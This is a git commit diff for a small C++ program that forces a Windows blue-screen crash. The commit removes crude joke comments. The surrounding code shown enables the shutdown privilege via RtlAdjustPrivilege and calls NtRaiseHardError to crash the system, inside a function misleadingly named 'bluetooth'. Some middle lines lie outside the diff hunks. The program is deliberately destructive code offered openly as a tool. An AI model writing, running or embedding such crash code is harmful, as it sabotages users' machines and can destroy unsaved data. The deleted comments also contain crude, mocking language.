3f0de31b406c96d1934a2fda31d61e9df8ef602b
029k <cheeselmao5@gmail.com>
2026-04-30 12:06:12 -0700

    Update blueth=othscreen.cpp
    removed shitty comments

--- basic bluescreen/blueth=othscreen.cpp
+++ basic bluescreen/blueth=othscreen.cpp
@@ -1,14 +1,7 @@
-// hi gays today illl show you gays how o get blutoot scween
-
-//firsst start off by inlcuidng dafringging uhh windows balls
 #include <Windows.h>
-// yes so thats not doinge done
-// nob we do whatever this means
 
 typedef NTSTATUS(NTAPI* pdef_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);
 typedef NTSTATUS(NTAPI* pdef_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);
-
-// now we make funktinonction to make it work
 
 void bluetooth()
 {
@@ -20,13 +13,9 @@ void bluetooth()
 	pdef_NtRaiseHardError NtCall2 = (pdef_NtRaiseHardError)lpFuncAddress2;
 	NTSTATUS NtRet = NtCall(19, TRUE, FALSE, &enabled);
 	NtCall2(STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, 0, 6, &response);
-} // thyes so diz is za function, tozally not pazzed
+}
 
 int main()
 {
-	// now qwe ecexcute the funtion
 	bluetooth();
-	// so yez diz is za blotooth function it will gig u za bluetoothscreengreen
-
-	/*bye gusgays*/
 }
